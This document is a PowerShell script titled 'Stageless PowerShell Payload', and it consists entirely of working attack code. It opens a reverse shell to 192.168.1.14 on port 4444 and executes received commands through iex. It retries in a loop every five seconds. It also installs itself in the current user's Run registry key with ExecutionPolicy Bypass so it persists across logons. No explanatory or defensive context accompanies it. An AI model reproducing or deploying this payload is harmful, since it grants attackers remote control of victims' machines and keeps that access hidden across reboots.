
# Stageless PowerShell Payload
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient('192.168.1.14', 4444);
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{0};
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte, 0, $sendbyte.Length);
            $stream.Flush()
        }
        $client.Close();
    } catch {
        Start-Sleep -Seconds 5;  # Wait before reconnecting
    }
}

# Persistence via Registry (Run Key)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "Payload"
$regValue = "powershell -ExecutionPolicy Bypass -File $PSCommandPath"
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
